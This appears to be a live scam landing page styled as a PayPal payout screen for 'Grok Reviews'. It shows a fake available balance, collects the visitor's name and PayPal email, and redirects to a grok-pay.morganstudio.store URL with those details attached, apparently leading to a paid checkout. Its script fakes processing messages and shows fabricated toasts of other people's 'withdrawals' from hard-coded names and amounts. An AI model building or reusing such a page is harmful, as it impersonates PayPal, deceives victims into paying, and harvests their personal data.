<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <!-- Meta Pixel Code (Grok Reviews) -->
<script src="/grok/pixels.js"></script>
<!-- End Meta Pixel Code -->

<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
<title>Grok Reviews</title>
<meta name="referrer" content="no-referrer"/>
<link rel="icon" href="/grok/favicon-64.png"/>
<script src="https://cdn.tailwindcss.com/3.4.1"></script>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
  @keyframes slideIn { from { transform: translateY(-24px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
  @keyframes slideOut { from { transform: translateY(0); opacity: 1; } to { transform: translateY(-24px); opacity: 0; } }
  .toast-in { animation: slideIn .4s ease-out forwards; }
  .toast-out { animation: slideOut .4s ease-in forwards; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .spinner { animation: spin .7s linear infinite; }
</style>
</head>
<body class="antialiased bg-[#f6f7f8] text-[#24272b] min-h-screen" data-funnel-view="checkout_seguro_19_usd">
<div >

<!-- Toast container -->
<div id="toasts" class="pointer-events-none fixed inset-x-0 top-3 z-[9999] mx-auto flex max-w-md flex-col gap-2 px-3"></div>

<main class="px-4 py-5 min-h-screen">
  <div class="mx-auto w-full max-w-lg">

    <!-- Progress bar -->
    <header class="px-0.5">
      <div class="w-full max-w-sm space-y-1.5">
        <div class="flex items-center justify-between text-[10px] font-medium text-[#69717b]">
          <span>Your progress</span>
          <span>100%</span>
        </div>
        <div class="h-1 w-full overflow-hidden rounded-full bg-[#e5e7eb]">
          <div class="h-full rounded-full bg-[#10b981] transition-[width] duration-500 ease-out" style="width:100%"></div>
        </div>
      </div>
    </header>

    <!-- Card -->
    <section class="mt-5 overflow-hidden rounded-3xl border-2 border-[#b9c9e8] bg-white shadow-[0_6px_18px_rgba(15,23,42,0.14)]">
      <div class="px-5 pb-6 pt-5 text-center">

        <img alt="PayPal" width="54" height="54" class="mx-auto rounded-[13px]" src="/grok/paypal-logo.png"/>

        <h1 class="mt-4 text-[19px] font-bold leading-tight tracking-[-0.3px]">Receive your money via PayPal</h1>

        <p class="mx-auto mt-1 max-w-[260px] text-[13px] leading-[1.35] text-[#69717b]">Enter your PayPal email to receive your available balance</p>

        <div class="mx-auto mt-3 w-fit rounded-xl border border-[#b9c9e8] bg-[#f3f7ff] px-5 py-2 text-center">
          <p class="text-[10px] font-semibold uppercase tracking-[0.08em] text-[#69717b]">Available balance</p>
          <p class="mt-0.5 text-xl font-bold tabular-nums text-[#003087]">$1,150.43</p>
        </div>

        <form id="payForm" class="mt-4 text-left" onsubmit="return handleSubmit(event)">
          <div class="grid grid-cols-2 gap-2.5">
            <div>
              <label for="pay-first-name" class="block text-[13px] font-medium">First name</label>
              <input id="pay-first-name" type="text" autocomplete="given-name" placeholder="First name"
                class="mt-2 h-14 w-full rounded-2xl border border-[#003087] bg-white px-3 text-base outline-none transition focus:ring-2 focus:ring-[#003087]/20"
                required name="first_name" oninput="checkFields()"/>
            </div>
            <div>
              <label for="pay-last-name" class="block text-[13px] font-medium">Last name</label>
              <input id="pay-last-name" type="text" autocomplete="family-name" placeholder="Last name"
                class="mt-2 h-14 w-full rounded-2xl border border-[#003087] bg-white px-3 text-base outline-none transition focus:ring-2 focus:ring-[#003087]/20"
                required name="last_name" oninput="checkFields()"/>
            </div>
          </div>

          <label for="pay-email" class="mt-3 block text-[13px] font-medium">PayPal Email</label>
          <input id="pay-email" type="email" autocomplete="email" placeholder="your@email.com"
            class="mt-2 h-14 w-full rounded-2xl border border-[#003087] bg-white px-4 text-base outline-none transition focus:ring-2 focus:ring-[#003087]/20"
            required name="email" oninput="checkFields()"/>

          <button id="submitBtn" type="submit" disabled
            class="mt-5 h-16 w-full rounded-2xl text-base font-extrabold shadow-[0_4px_8px_rgba(0,0,0,0.10)] transition bg-[#dedede] text-[#9da4ad]">
            WITHDRAW TO MY ACCOUNT
          </button>
        </form>

      </div>

      <footer class="flex items-center justify-center gap-2 border-t border-[#dfe3e7] bg-[#f8f9fa] px-4 py-3 text-center text-[11px] leading-[1.35] text-[#69717b]">
        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="shrink-0 text-[#2da653]">
          <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
          <path d="m9 12 2 2 4-4"></path>
        </svg>
        <span>Your information is protected and will only be used for payment processing.</span>
      </footer>
    </section>

  </div>
</main>

<script>
// Auto-fill from URL params
(function() {
  var p = new URLSearchParams(window.location.search);
  var fn = p.get('first_name') || '';
  var ln = p.get('last_name') || '';
  var em = p.get('email') || '';
  if (fn) document.getElementById('pay-first-name').value = fn;
  if (ln) document.getElementById('pay-last-name').value = ln;
  if (em) document.getElementById('pay-email').value = em;
  checkFields();
})();

function checkFields() {
  var fn = document.getElementById('pay-first-name').value.trim();
  var ln = document.getElementById('pay-last-name').value.trim();
  var em = document.getElementById('pay-email').value.trim();
  var btn = document.getElementById('submitBtn');
  if (fn && ln && em) {
    btn.disabled = false;
    btn.className = 'mt-5 h-16 w-full rounded-2xl text-base font-extrabold shadow-[0_4px_8px_rgba(0,0,0,0.10)] transition bg-[#003087] text-white hover:bg-[#002060] active:scale-[0.98]';
  } else {
    btn.disabled = true;
    btn.className = 'mt-5 h-16 w-full rounded-2xl text-base font-extrabold shadow-[0_4px_8px_rgba(0,0,0,0.10)] transition bg-[#dedede] text-[#9da4ad]';
  }
}

function handleSubmit(e) {
  e.preventDefault();
  var btn = document.getElementById('submitBtn');
  btn.disabled = true;
  btn.innerHTML = '<svg class="spinner inline-block mr-2" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10" stroke-opacity=".3"/><path d="M12 2a10 10 0 0 1 10 10"/></svg>Processing...';
  btn.className = 'mt-5 h-16 w-full rounded-2xl text-base font-extrabold shadow-[0_4px_8px_rgba(0,0,0,0.10)] transition bg-[#003087] text-white opacity-80';

  setTimeout(function() {
    btn.innerHTML = '<svg class="spinner inline-block mr-2" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10" stroke-opacity=".3"/><path d="M12 2a10 10 0 0 1 10 10"/></svg>Connecting to PayPal...';
  }, 2000);

  setTimeout(function() {
    // Redirect placeholder — swap this URL for real checkout
    var params = new URLSearchParams(window.location.search).toString();
    window.location.href = 'https://grok-pay.morganstudio.store/' + (params ? '?' + params : '');
  }, 4000);

  return false;
}

// ── Withdrawal notification toasts ──
var NAMES = [
  'Emma W.','James K.','Sophia R.','Lucas M.','Olivia T.','Noah B.',
  'Ava C.','Liam P.','Mia D.','Ethan F.','Isabella G.','Mason H.',
  'Charlotte J.','Logan S.','Amelia V.','Alexander N.','Harper L.',
  'Benjamin Q.','Evelyn U.','Daniel Z.'
];
var AMOUNTS = ['$347.00','$1,150.43','$697.00','$450.00','$892.50','$1,044.00','$523.00','$780.00','$1,150.43','$347.00'];

function showToast() {
  var container = document.getElementById('toasts');
  var name = NAMES[Math.floor(Math.random() * NAMES.length)];
  var amount = AMOUNTS[Math.floor(Math.random() * AMOUNTS.length)];
  var mins = Math.floor(Math.random() * 12) + 1;

  var toast = document.createElement('div');
  toast.className = 'toast-in relative flex w-full items-center gap-3 rounded-2xl border border-[#e5e7eb]/70 bg-white/95 p-2.5 pr-3 shadow-xl shadow-black/10 backdrop-blur-sm';
  toast.innerHTML =
    '<img src="/grok/robot-money-logo.png" alt="" class="size-8 shrink-0 rounded-md"/>' +
    '<div class="min-w-0 flex-1">' +
      '<p class="text-[11px] font-bold text-[#24272b] truncate">' + name + ' withdrew ' + amount + '</p>' +
      '<p class="text-[10px] text-[#69717b]">' + mins + ' min ago via PayPal</p>' +
    '</div>';

  container.prepend(toast);

  setTimeout(function() {
    toast.className = toast.className.replace('toast-in', 'toast-out');
    setTimeout(function() { toast.remove(); }, 400);
  }, 4000);
}

// First toast after 3s, then every 8-12s
setTimeout(showToast, 3000);
setInterval(function() {
  setTimeout(showToast, Math.random() * 4000);
}, 8000);
</script>
</div>
</body>
</html>
